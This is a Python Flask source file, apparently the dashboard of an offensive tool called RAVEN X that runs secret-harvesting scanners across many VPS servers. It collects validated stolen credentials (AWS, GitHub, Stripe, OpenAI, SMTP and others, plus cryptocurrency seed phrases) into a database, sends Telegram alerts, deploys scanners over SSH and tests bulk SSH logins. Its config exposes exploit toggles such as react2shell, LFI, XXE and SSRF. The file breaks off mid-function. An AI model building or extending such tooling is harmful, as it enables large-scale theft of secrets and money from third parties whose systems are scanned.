#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAVEN X 2.0 - Real-time Dashboard with VPS Management
- Local results monitoring
- Remote VPS deployment & control
- Multi-server monitoring
"""

from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
import sqlite3
import threading
import time
from datetime import datetime
import os
import re
import json
import subprocess
import shutil

# Import SSH Manager
try:
    from ssh_manager import get_manager, SSHManager
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("⚠️ SSH Manager not available - VPS features disabled")

app = Flask(__name__)
app.config['SECRET_KEY'] = 'raven-x-secret-change-in-production'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DB_PATH = 'raven_results.db'
RESULTS_DIR = 'ResultJS'

# File mapping: (type, status)
FILE_MAPPING = {
    # VALID - Save full details
    'aws_valid.txt': ('AWS', 'valid'),
    'aws_credentials.txt': ('AWS', 'valid'),
    'valid_github_token.txt': ('GitHub', 'valid'),
    'valid_sendgrid.txt': ('SendGrid', 'valid'),
    'valid_stripe.txt': ('Stripe', 'valid'),
    'valid_openai.txt': ('OpenAI', 'valid'),
    'valid_anthropic.txt': ('Anthropic', 'valid'),
    'smtp_valid.txt': ('SMTP', 'valid'),
    'valid_mailgun.txt': ('Mailgun', 'valid'),
    'valid_twilio.txt': ('Twilio', 'valid'),
    'valid_nexmo.txt': ('Nexmo', 'valid'),
    'valid_telnyx.txt': ('Telnyx', 'valid'),
    'valid_messagebird.txt': ('MessageBird', 'valid'),
    'valid_brevo.txt': ('Brevo', 'valid'),
    'valid_mandrill.txt': ('Mandrill', 'valid'),
    'valid_mailersend.txt': ('MailerSend', 'valid'),
    'valid_gcp_key.txt': ('GCP', 'valid'),
    'mnemonic_seed_phrases.txt': ('Mnemonic', 'valid'),
    'trufflehog_secrets.txt': ('TruffleHog', 'valid'),
    'gitleaks_secrets.txt': ('GitLeaks', 'valid'),
    # Wave-5 — pattern-only finds (saved by main.go's nonValidatedChecks loop)
    'Slack_Bot_Token_found.txt':       ('Slack',         'valid'),
    'Slack_User_Token_found.txt':      ('Slack',         'valid'),
    'Slack_Webhook_found.txt':         ('Slack',         'hit'),
    'Discord_Bot_Token_found.txt':     ('Discord',       'valid'),
    'Discord_Webhook_found.txt':       ('Discord',       'hit'),
    'Cloudflare_Global_found.txt':     ('Cloudflare',    'valid'),
    'DigitalOcean_PAT_found.txt':      ('DigitalOcean',  'valid'),
    'Heroku_API_Key_found.txt':        ('Heroku',        'valid'),
    'Datadog_API_Key_found.txt':       ('Datadog',       'valid'),
    'Sentry_DSN_found.txt':            ('Sentry',        'valid'),
    'NPM_Token_found.txt':             ('NPM',           'valid'),
    'PyPI_Token_found.txt':            ('PyPI',          'valid'),
    'GitLab_PAT_found.txt':            ('GitLab',        'valid'),
    'JWT_found.txt':                   ('JWT',           'hit'),
    'Postmark_Server_Token_found.txt': ('Postmark',      'valid'),
    'Mailjet_API_Key_found.txt':       ('Mailjet',       'valid'),
    'AWS_SNS_Topic_ARN_found.txt':     ('AWS SNS',       'hit'),
    # HITS - Only count
    'smtp_found.txt': ('SMTP', 'hit'),
}

URL_LOG_FILE = os.path.join(RESULTS_DIR, 'scanned_urls.txt')
total_urls_scanned = 0
scan_start_time = time.time()
file_mtimes = {}

# ==================== LOCAL RESULTS MONITORING ====================

def count_urls_from_log():
    if not os.path.exists(URL_LOG_FILE):
        return 0
    try:
        with open(URL_LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return sum(1 for line in f if line.strip())
    except:
        return 0

def count_smtp_hits():
    smtp_found_file = os.path.join(RESULTS_DIR, 'smtp_found.txt')
    if not os.path.exists(smtp_found_file):
        return 0
    try:
        with open(smtp_found_file, 'r', encoding='utf-8', errors='ignore') as f:
            return sum(1 for line in f if line.strip())
    except:
        return 0

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            type TEXT NOT NULL,
            key_value TEXT NOT NULL,
            source_url TEXT,
            status TEXT DEFAULT 'valid',
            metadata TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(type, key_value)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS statistics (
            id INTEGER PRIMARY KEY,
            total_urls_scanned INTEGER DEFAULT 0,
            total_hits_found INTEGER DEFAULT 0,
            total_credentials_valid INTEGER DEFAULT 0,
            smtp_servers_found INTEGER DEFAULT 0,
            last_update DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('INSERT OR IGNORE INTO statistics (id) VALUES (1)')
    
    try:
        cursor.execute("SELECT smtp_servers_found FROM statistics LIMIT 1")
    except sqlite3.OperationalError:
        cursor.execute("ALTER TABLE statistics ADD COLUMN smtp_servers_found INTEGER DEFAULT 0")
    
    conn.commit()
    conn.close()
    print("✅ Database initialized")

def import_from_files():
    global total_urls_scanned
    
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
        return 0, 0
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    imported_valid = 0
    imported_hits = 0
    
    for filename, (cred_type, status) in FILE_MAPPING.items():
        filepath = os.path.join(RESULTS_DIR, filename)
        
        if not os.path.exists(filepath):
            continue
        
        current_mtime = os.path.getmtime(filepath)
        if filepath in file_mtimes and file_mtimes[filepath] == current_mtime:
            continue
        
        file_mtimes[filepath] = current_mtime
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    if status == 'hit':
                        imported_hits += 1
                        continue
                    
                    parts = line.split(':', 1)
                    if len(parts) < 2:
                        continue
                    
                    source_url = parts[0].strip()
                    key_and_rest = parts[1].strip()
                    
                    key_parts = key_and_rest.split(':', 1)
                    key_value = key_parts[0].strip()
                    metadata = key_parts[1].strip() if len(key_parts) > 1 else ""
                    
                    cursor.execute('''
                        INSERT OR IGNORE INTO credentials (type, key_value, source_url, metadata, status)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (cred_type, key_value, source_url, metadata, 'valid'))
                    
                    if cursor.rowcount > 0:
                        imported_valid += 1
        
        except Exception as e:
            print(f"⚠️ Error reading {filename}: {e}")
    
    cursor.execute('SELECT COUNT(*) FROM credentials WHERE status="valid"')
    total_valid = cursor.fetchone()[0]
    
    total_lines = 0
    for filename in FILE_MAPPING.keys():
        filepath = os.path.join(RESULTS_DIR, filename)
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    total_lines += sum(1 for line in f if line.strip())
            except:
                pass
    
    total_urls_scanned = count_urls_from_log()
    smtp_servers = count_smtp_hits()
    
    cursor.execute('''
        UPDATE statistics 
        SET total_urls_scanned = ?, total_hits_found = ?, total_credentials_valid = ?,
            smtp_servers_found = ?, last_update = CURRENT_TIMESTAMP
        WHERE id = 1
    ''', (total_urls_scanned, total_lines, total_valid, smtp_servers))
    
    conn.commit()
    conn.close()
    
    return imported_valid, imported_hits

def get_statistics():
    global scan_start_time
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM statistics WHERE id = 1')
    stats = cursor.fetchone()
    
    cursor.execute('''
        SELECT type, COUNT(*) as count FROM credentials
        WHERE status = 'valid' GROUP BY type ORDER BY count DESC
    ''')
    type_counts = dict(cursor.fetchall())
    
    cursor.execute('''
        SELECT type, key_value, source_url, timestamp, metadata
        FROM credentials WHERE status = 'valid'
        ORDER BY id DESC LIMIT 50
    ''')
    recent_findings = cursor.fetchall()
    
    conn.close()
    
    total_urls = stats[1] if stats else 0
    total_hits = stats[2] if stats else 0
    total_valid = stats[3] if stats else 0
    smtp_servers = stats[4] if stats and len(stats) > 4 else 0
    
    elapsed_time = time.time() - scan_start_time
    scan_rate = total_urls / elapsed_time if elapsed_time > 0 and total_urls > 0 else 0
    
    progress_percent = min(100, (total_hits / max(total_urls, 1)) * 100) if total_urls > 0 else 0
    
    return {
        'total_urls': total_urls,
        'total_hits': total_hits,
        'total_valid': total_valid,
        'smtp_servers': smtp_servers,
        'type_counts': type_counts,
        'recent_findings': recent_findings,
        'last_update': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'progress_current': total_urls,
        'progress_total': total_hits,
        'progress_percent': round(progress_percent, 1),
        'scan_rate': round(scan_rate, 2)
    }

def background_file_monitor():
    last_count = 0
    while True:
        time.sleep(2)
        try:
            imported_valid, imported_hits = import_from_files()
            stats = get_statistics()
            current_count = stats['total_valid']
            
            if current_count != last_count or imported_hits > 0:
                socketio.emit('stats_update', stats)
                last_count = current_count
        except Exception as e:
            print(f"⚠️ File monitor error: {e}")

# ==================== VPS MANAGEMENT (SSH) ====================

def get_ssh_manager():
    """Get SSH manager instance"""
    if SSH_AVAILABLE:
        return get_manager()
    return None

def vps_status_callback(data):
    """Callback for VPS status updates"""
    socketio.emit('vps_update', data)

# ==================== ROUTES ====================

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/vps')
def vps_page():
    return render_template('vps.html')

@app.route('/api/stats')
def api_stats():
    return jsonify(get_statistics())

@app.route('/api/clear', methods=['POST'])
def api_clear():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM credentials')
        cursor.execute('UPDATE statistics SET total_urls_scanned=0, total_hits_found=0, total_credentials_valid=0, smtp_servers_found=0 WHERE id=1')
        conn.commit()
        conn.close()
        
        if os.path.exists(RESULTS_DIR):
            for filename in os.listdir(RESULTS_DIR):
                filepath = os.path.join(RESULTS_DIR, filename)
                if os.path.isfile(filepath):
                    try:
                        os.remove(filepath)
                    except:
                        pass
        
        global file_mtimes, scan_start_time
        file_mtimes.clear()
        scan_start_time = time.time()
        
        socketio.emit('stats_update', get_statistics())
        return jsonify({'success': True, 'message': 'Results cleared'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

# ==================== VPS API ROUTES ====================

@app.route('/api/vps/available')
def api_vps_available():
    """Check if VPS management is available"""
    return jsonify({'available': SSH_AVAILABLE})

@app.route('/api/vps/config', methods=['GET', 'POST'])
def api_vps_config():
    """Get or update VPS configuration"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    if request.method == 'POST':
        data = request.json
        manager.update_config(data)
        return jsonify({'success': True, 'config': manager.get_config()})
    
    return jsonify(manager.get_config())

@app.route('/api/vps/servers', methods=['GET', 'POST', 'PUT'])
def api_vps_servers():
    """Get, add, or update server list"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    if request.method == 'POST':
        data = request.json
        ips = data.get('servers', [])
        manager.save_servers(ips)
        return jsonify({'success': True, 'count': len(ips)})
    
    if request.method == 'PUT':
        data = request.json
        ip = data.get('ip')
        if ip:
            servers = manager.load_servers()
            if ip not in servers:
                servers.append(ip)
                manager.save_servers(servers)
        return jsonify({'success': True, 'servers': manager.load_servers()})
    
    return jsonify({'servers': manager.load_servers()})

@app.route('/api/vps/status')
def api_vps_status():
    """Get status of all VPS servers"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    servers = manager.get_all_status()
    stats = manager.get_global_stats()
    
    return jsonify({
        'servers': servers,
        'stats': stats
    })

@app.route('/api/vps/server/<ip>/status')
def api_vps_server_status(ip):
    """Get status of a specific server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    status = manager.fetch_server_status(ip)
    return jsonify(status.to_dict())

@app.route('/api/vps/server/<ip>/test')
def api_vps_test_connection(ip):
    """Test connection to a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.test_connection(ip))

@app.route('/api/vps/server/<ip>/start', methods=['POST'])
def api_vps_start_server(ip):
    """Start scanner on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.start_server(ip))

@app.route('/api/vps/server/<ip>/stop', methods=['POST'])
def api_vps_stop_server(ip):
    """Stop scanner on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.stop_server(ip))

@app.route('/api/vps/server/<ip>/restart', methods=['POST'])
def api_vps_restart_server(ip):
    """Restart scanner on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.restart_server(ip))

@app.route('/api/vps/server/<ip>/logs')
def api_vps_server_logs(ip):
    """Get logs from a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    lines = request.args.get('lines', 50, type=int)
    return jsonify(manager.get_server_logs(ip, lines))

@app.route('/api/vps/server/<ip>/diagnose')
def api_vps_diagnose_server(ip):
    """Run diagnostics on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.diagnose_server(ip))

@app.route('/api/vps/server/<ip>/fix', methods=['POST'])
def api_vps_fix_server(ip):
    """Attempt to fix issues on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.fix_server(ip))

@app.route('/api/vps/server/<ip>/deploy', methods=['POST'])
def api_vps_deploy_server(ip):
    """Deploy to a specific server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    package = request.json.get('package') if request.json else None
    return jsonify(manager.deploy_to_server(ip, package))

@app.route('/api/vps/server/<ip>/collect', methods=['POST'])
def api_vps_collect_server(ip):
    """Collect results from a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.collect_results(ip))

# Bulk operations
@app.route('/api/vps/start-all', methods=['POST'])
def api_vps_start_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.start_all())

@app.route('/api/vps/stop-all', methods=['POST'])
def api_vps_stop_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.stop_all())

@app.route('/api/vps/restart-all', methods=['POST'])
def api_vps_restart_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.restart_all())

@app.route('/api/vps/deploy-all', methods=['POST'])
def api_vps_deploy_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    package = request.json.get('package') if request.json else None
    return jsonify(manager.deploy_all(package))

@app.route('/api/vps/collect-all', methods=['POST'])
def api_vps_collect_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.collect_all_results())

@app.route('/api/vps/test-connections', methods=['POST'])
def api_vps_test_connections():
    """Test connections to all servers"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.test_all_connections())

@app.route('/api/vps/prepare-deploy', methods=['POST'])
def api_vps_prepare_deploy():
    """Prepare deployment - test connections, count targets, calculate split"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    data = request.json or {}
    target_file = data.get('target_file')
    return jsonify(manager.prepare_deployment(target_file))

@app.route('/api/vps/deploy', methods=['POST'])
def api_vps_deploy():
    """Full deployment - split targets, upload, setup, optionally start"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    data = request.json or {}
    result = manager.deploy_full(
        target_file=data.get('target_file'),
        scanner_file=data.get('scanner_file'),
        runner_file=data.get('runner_file'),
        auto_start=data.get('auto_start', False)
    )
    return jsonify(result)

@app.route('/api/vps/upload-targets', methods=['POST'])
def api_vps_upload_targets():
    """Upload target file"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Save to targets.txt
    target_path = 'targets.txt'
    file.save(target_path)
    
    # Count lines
    with open(target_path, 'r') as f:
        count = sum(1 for line in f if line.strip())
    
    return jsonify({'success': True, 'filename': file.filename, 'targets': count})

@app.route('/api/vps/upload-chunk', methods=['POST'])
def api_vps_upload_chunk():
    """Accept one 5 MB chunk of a large target-list upload."""
    data = request.get_json(force=True, silent=True) or {}
    upload_id = str(data.get('upload_id', ''))
    chunk_index = int(data.get('chunk_index', -1))
    content = data.get('content', '')

    if not re.match(r'^[a-zA-Z0-9_-]{8,64}$', upload_id):
        return jsonify({'error': 'Invalid upload_id'}), 400
    if chunk_index < 0:
        return jsonify({'error': 'Invalid chunk_index'}), 400

    chunk_dir = f'/tmp/reconx_{upload_id}'
    os.makedirs(chunk_dir, exist_ok=True)
    chunk_path = os.path.join(chunk_dir, f'{chunk_index:08d}')

    with open(chunk_path, 'w', encoding='utf-8') as f:
        f.write(content)

    return jsonify({'ok': True, 'chunk': chunk_index})


@app.route('/api/vps/finalize-upload', methods=['POST'])
def api_vps_finalize_upload():
    """Assemble chunks written by /upload-chunk into targets.txt."""
    data = request.get_json(force=True, silent=True) or {}
    upload_id = str(data.get('upload_id', ''))
    total_chunks = int(data.get('total_chunks', 0))
    filename = str(data.get('filename', 'targets.txt'))

    if not re.match(r'^[a-zA-Z0-9_-]{8,64}$', upload_id):
        return jsonify({'error': 'Invalid upload_id'}), 400

    chunk_dir = f'/tmp/reconx_{upload_id}'
    if not os.path.isdir(chunk_dir):
        return jsonify({'error': 'Upload session not found — chunks may have expired'}), 404

    target_path = 'targets.txt'
    count = 0
    try:
        with open(target_path, 'w', encoding='utf-8') as out:
            for i in range(total_chunks):
                chunk_path = os.path.join(chunk_dir, f'{i:08d}')
                if not os.path.exists(chunk_path):
                    return jsonify({'error': f'Missing chunk {i}'}), 400
                with open(chunk_path, 'r', encoding='utf-8') as cf:
                    for line in cf:
                        stripped = line.strip()
                        if stripped:
                            out.write(stripped + '\n')
                            count += 1
    finally:
        shutil.rmtree(chunk_dir, ignore_errors=True)

    return jsonify({'success': True, 'filename': filename, 'targets': count})


@app.route('/api/vps/test-ssh', methods=['POST'])
def api_vps_test_ssh():
    """Quick SSH key validation - check if key exists and is valid"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.quick_ssh_test())

@app.route('/api/vps/test-single/<ip>', methods=['POST'])
def api_vps_test_single(ip):
    """Test SSH connection to a single server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    timeout = request.json.get('timeout', 5) if request.json else 5
    return jsonify(manager.test_single_connection(ip, timeout))

@app.route('/api/vps/list-files')
def api_vps_list_files():
    """List local files available for selection as targets"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    directory = request.args.get('dir', '.')
    files = manager.list_local_files(directory)
    return jsonify({'files': files})

@app.route('/api/vps/select-file', methods=['POST'])
def api_vps_select_file():
    """Select an existing file as target"""
    data = request.json or {}
    filepath = data.get('path')
    
    if not filepath:
        return jsonify({'error': 'No file path provided'}), 400
    
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    
    # Count lines
    try:
        with open(filepath, 'r', errors='ignore') as f:
            count = sum(1 for line in f if line.strip())
        
        # Update config to use this file
        manager = get_ssh_manager()
        if manager:
            manager.update_config({'target_file': filepath})
        
        return jsonify({
            'success': True, 
            'path': filepath, 
            'filename': os.path.basename(filepath),
            'targets': count
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ==================== SCANNER CONFIG ====================

SCANNER_CONFIG_PATH = 'config.json'

# Only these keys may be read/written via the dashboard. Every flag listed here
# is consumed by main.go at runtime — see audit notes in CrackerWorkspace.
SCANNER_CONFIG_SCHEMA = {
    'scanning_features': ['aws_main_scan', 'github_token_deep_scan', 'smtp_credentials_scan'],
    'aws_checks': ['ses_quota_check', 'sns_limit_check', 'fargate_limit_check', 'federation_console_url'],
    'api_validation': [
        'openai', 'anthropic', 'ai_all', 'stripe', 'gcp_api_key', 'sendgrid', 'mailgun',
        'twilio', 'nexmo', 'telnyx', 'messagebird', 'github',
    ],
    'features': ['brevo', 'xsmtp', 'mandrill', 'mailersend', 'new_mailgun'],
    'exploit_methods': ['react2shell', 'bypass_waf', 'bypass_middleware', 'lfi', 'xxe', 'ssrf'],
}


def _load_scanner_config():
    if not os.path.exists(SCANNER_CONFIG_PATH):
        return {}
    with open(SCANNER_CONFIG_PATH, 'r') as f:
        return json.load(f)


def _scanner_config_view(cfg):
    out = {}
    for section, keys in SCANNER_CONFIG_SCHEMA.items():
        block = cfg.get(section) or {}
        out[section] = {k: bool(block.get(k, False)) for k in keys}
    return out


@app.route('/api/scanner-config', methods=['GET', 'POST'])
def api_scanner_config():
    """Read or update the live scanner toggles in raven/config.json.
    Only whitelisted keys (those actually consumed by main.go) are exposed."""
    try:
        cfg = _load_scanner_config()
    except Exception as e:
        return jsonify({'error': f'Could not read config: {e}'}), 500

    if request.method == 'POST':
        body = request.json or {}
        for section, keys in SCANNER_CONFIG_SCHEMA.items():
            incoming = body.get(section)
            if not isinstance(incoming, dict):
                continue
            current = cfg.get(section)
            if not isinstance(current, dict):
                current = {}
                cfg[section] = current
            for k in keys:
                if k in incoming:
                    current[k] = bool(incoming[k])
        try:
            with open(SCANNER_CONFIG_PATH, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception as e:
            return jsonify({'error': f'Could not write config: {e}'}), 500

    return jsonify(_scanner_config_view(cfg))


# ==================== TELEGRAM ====================


@app.route('/api/telegram', methods=['GET', 'POST'])
def api_telegram():
    """Read/write telegram bot_token + chat_id in config.json. Used by main.go for outbound alerts."""
    try:
        cfg = _load_scanner_config()
    except Exception as e:
        return jsonify({'error': f'Could not read config: {e}'}), 500

    if request.method == 'POST':
        body = request.json or {}
        tg = cfg.get('telegram')
        if not isinstance(tg, dict):
            tg = {}
            cfg['telegram'] = tg
        if 'bot_token' in body:
            tg['bot_token'] = str(body['bot_token'] or '')
        if 'chat_id' in body:
            tg['chat_id'] = str(body['chat_id'] or '')
        try:
            with open(SCANNER_CONFIG_PATH, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception as e:
            return jsonify({'error': f'Could not write config: {e}'}), 500

    tg = cfg.get('telegram') or {}
    # Mask token in GET response — return only whether it's present + last 4 chars for confirmation
    token = str(tg.get('bot_token') or '')
    masked = f'…{token[-4:]}' if len(token) > 4 else ''
    return jsonify({
        'has_token': bool(token),
        'token_tail': masked,
        'chat_id': str(tg.get('chat_id') or ''),
    })


@app.route('/api/telegram/test', methods=['POST'])
def api_telegram_test():
    """Send a test message via the configured telegram bot. Returns success / error."""
    import urllib.request
    import urllib.parse
    try:
        cfg = _load_scanner_config()
    except Exception as e:
        return jsonify({'success': False, 'error': f'Could not read config: {e}'}), 500
    tg = cfg.get('telegram') or {}
    token = tg.get('bot_token') or ''
    chat = tg.get('chat_id') or ''
    if not token or not chat:
        return jsonify({'success': False, 'error': 'Telegram not configured (bot_token + chat_id required).'}), 400
    text = (request.json or {}).get('text') if request.is_json else None
    payload = urllib.parse.urlencode({'chat_id': chat, 'text': text or 'ReconX dashboard test ping.'}).encode()
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    try:
        with urllib.request.urlopen(url, data=payload, timeout=8) as resp:
            data = json.loads(resp.read().decode('utf-8') or '{}')
        if not data.get('ok'):
            return jsonify({'success': False, 'error': str(data.get('description') or 'Telegram refused.')}), 502
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 502


# ── Cloudflare R2 upload ───────────────────────────────────────────────────
R2_CONFIG_KEY = 'r2'

def _get_r2_client():
    """Return (boto3_client, bucket_name) or (None, None) if R2 not configured."""
    cfg = _load_scanner_config()
    r2 = cfg.get(R2_CONFIG_KEY, {})
    account_id  = r2.get('account_id', '').strip()
    access_key  = r2.get('access_key_id', '').strip()
    secret_key  = r2.get('secret_access_key', '').strip()
    bucket      = r2.get('bucket_name', '').strip()
    if not all([account_id, access_key, secret_key, bucket]):
        return None, None
    try:
        import boto3
        client = boto3.client(
            's3',
            endpoint_url=f'https://{account_id}.r2.cloudflarestorage.com',
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name='auto',
        )
        return client, bucket
    except Exception:
        return None, None


@app.route('/api/upload/r2-config', methods=['GET', 'POST'])
def api_r2_config():
    """Read or write R2 credentials in config.json."""
    cfg = _load_scanner_config()
    if request.method == 'POST':
        data = request.get_json(force=True, silent=True) or {}
        cfg[R2_CONFIG_KEY] = {
            'account_id':       str(data.get('account_id', '')).strip(),
            'access_key_id':    str(data.get('access_key_id', '')).strip(),
            'secret_access_key':str(data.get('secret_access_key', '')).strip(),
            'bucket_name':      str(data.get('bucket_name', '')).strip(),
        }
        with open(SCANNER_CONFIG_PATH, 'w') as f:
            json.dump(cfg, f, indent=2)
    r2 = cfg.get(R2_CONFIG_KEY, {})
    return jsonify({
        'account_id':    r2.get('account_id', ''),
        'access_key_id': r2.get('access_key_id', ''),
        'secret_access_key': '●' * 8 if r2.get('secret_access_key') else '',
        'bucket_name':   r2.get('bucket_name', ''),
        'configured':    bool(r2.get('account_id') and r2.get('access_key_id') and r2.get('secret_access_key') and r2.get('bucket_name')),
    })


@app.route('/api/upload/presign', methods=['GET'])
def api_upload_presign():
    """Generate a pre-signed PUT URL for direct browser → R2 upload."""
    client, bucket = _get_r2_client()
    if not client:
        return jsonify({'error': 'R2 not configured'}), 503
    import uuid as _uuid
    filename   = request.args.get('filename', 'targets.txt')
    upload_id  = _uuid.uuid4().hex
    key        = f'uploads/{upload_id}/{filename}'
    try:
        url = client.generate_presigned_url(
            'put_object',
            Params={'Bucket': bucket, 'Key': key, 'ContentType': 'text/plain'},
            ExpiresIn=7200,
        )
        return jsonify({'url': url, 'key': key, 'upload_id': upload_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/upload/complete', methods=['POST'])
def api_upload_complete():
    """Download the uploaded file from R2, save as targets.txt, return line count + preview."""
    client, bucket = _get_r2_client()
    if not client:
        return jsonify({'error': 'R2 not configured'}), 503
    data     = request.get_json(force=True, silent=True) or {}
    key      = str(data.get('key', ''))
    filename = str(data.get('filename', 'targets.txt'))
    if not key:
        return jsonify({'error': 'key required'}), 400
    try:
        obj      = client.get_object(Bucket=bucket, Key=key)
        body     = obj['Body']
        count    = 0
        preview  = []
        with open('targets.txt', 'w', encoding='utf-8') as out:
            for raw_line in body.iter_lines():
                line = raw_line.decode('utf-8', errors='replace').strip()
                if line:
                    out.write(line + '\n')
                    count += 1
                    if len(preview) < 6:
                        preview.append(line)
        # Clean up from R2 after processing
        try:
            client.delete_object(Bucket=bucket, Key=key)
        except Exception:
            pass
        return jsonify({'success': True, 'targets': count, 'preview': preview, 'filename': filename})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ==================== SSH BULK CREDS ====================


def _parse_creds_text(text: str):
    """Parse a bulk-creds text blob. Returns list of dicts:
       {host, port, user, auth_kind, secret}
    Accepted line forms (see installer.txt for full spec):
       host
       user@host
       user@host:port:auth_kind:secret
    """
    rows = []
    for raw in text.splitlines():
        s = raw.strip()
        if not s or s.startswith('#'):
            continue
        user = 'root'
        port = 22
        auth_kind = 'key'
        secret = ''
        if '@' in s:
            user, rest = s.split('@', 1)
        else:
            rest = s
        # rest = host[:port[:auth_kind:secret]]
        parts = rest.split(':')
        host = parts[0]
        if len(parts) >= 2 and parts[1].isdigit():
            port = int(parts[1])
        if len(parts) >= 4:
            auth_kind = parts[2].lower()
            secret = ':'.join(parts[3:])  # secret may contain colons (paths, passwords)
        if not host:
            continue
        rows.append({'host': host, 'port': port, 'user': user,
                     'auth_kind': auth_kind, 'secret': secret, 'raw': s})
    return rows


@app.route('/api/fleet/bulk-creds', methods=['POST'])
def api_fleet_bulk_creds():
    """Parse + test a batch of SSH credentials. Body: either form-file 'file'
    or JSON {"text": "..."} or JSON {"creds": [{host,port,user,auth_kind,secret}, ...]}.
    Returns per-row {ok, message} after a quick paramiko connect."""
    try:
        import paramiko
    except ImportError:
        return jsonify({'error': 'paramiko not installed'}), 500

    body_text = ''
    if 'file' in request.files:
        body_text = request.files['file'].read().decode('utf-8', errors='ignore')
    elif request.is_json:
        data = request.json or {}
        if isinstance(data.get('text'), str):
            body_text = data['text']
        elif isinstance(data.get('creds'), list):
            # already structured — turn into per-row dicts directly
            rows = []
            for c in data['creds']:
                if not isinstance(c, dict) or not c.get('host'):
                    continue
                rows.append({
                    'host': str(c.get('host')),
                    'port': int(c.get('port') or 22),
                    'user': str(c.get('user') or 'root'),
                    'auth_kind': str(c.get('auth_kind') or 'key'),
                    'secret': str(c.get('secret') or ''),
                    'raw': str(c.get('host')),
                })
        else:
            return jsonify({'error': 'send "text" or "creds"'}), 400
    else:
        body_text = request.get_data(as_text=True) or ''

    if body_text:
        rows = _parse_creds_text(body_text)
    if not rows:
        return jsonify({'error': 'no valid credential rows parsed'}), 400

    results = []
    accepted_ips = []
    for r in rows:
        result = {'host': r['host'], 'port': r['port'], 'user': r['user'], 'ok': False, 'message': ''}
        try:
            cli = paramiko.SSHClient()
            cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            kwargs = {'hostname': r['host'], 'port': r['port'], 'username': r['user'], 'timeout': 6}
            if r['auth_kind'] == 'password':
                kwargs['password'] = r['secret']
            else:
